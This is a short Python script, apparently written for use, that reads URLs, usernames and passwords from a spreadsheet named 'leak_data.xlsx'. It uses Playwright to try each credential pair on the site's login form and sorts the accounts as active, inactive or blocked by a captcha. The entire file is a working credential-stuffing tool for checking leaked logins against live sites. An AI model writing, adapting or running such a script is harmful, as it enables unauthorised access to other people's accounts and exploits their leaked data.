import pandas as pd
from playwright.sync_api import sync_playwright

# Load your dataset
df = pd.read_excel("C:/Users/Hp_Owner/Desktop/Vertoz/connectseller/upscalling Chatbot/leak_data.xlsx")

results = []

def verify_credentials(url, username, password):
    """Attempts login on given URL using provided credentials"""
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()

        try:
            page.goto(url, timeout=30000)

            # --- These selectors must be adapted depending on site ---
            page.fill("input[name='username']", str(username))
            page.fill("input[name='password']", str(password))
            page.click("button[type='submit']")

            page.wait_for_timeout(5000)  # wait after submit

            content = page.content().lower()

            if "captcha" in content:
                status = "Manual Check (Captcha)"
            elif "dashboard" in content or "welcome" in content or "logout" in content:
                status = "Active"
            else:
                status = "Inactive"

        except Exception as e:
            status = f"Error: {str(e)}"
        finally:
            browser.close()

    return status

# Iterate over rows
for _, row in df.iterrows():
    url, privacy, date, username, password = row["Url"], row["Privacy"], row["Date"], row["username"], row["Password"]

    status = verify_credentials(url, username, password)
    results.append({
        "Url": url,
        "Privacy": privacy,
        "Date": date,
        "username": username,
        "status": status
    })

# Save classification results
output_df = pd.DataFrame(results)
output_df.to_csv("verification_results.csv", index=False)

print("Verification complete. Results saved to verification_results.csv")
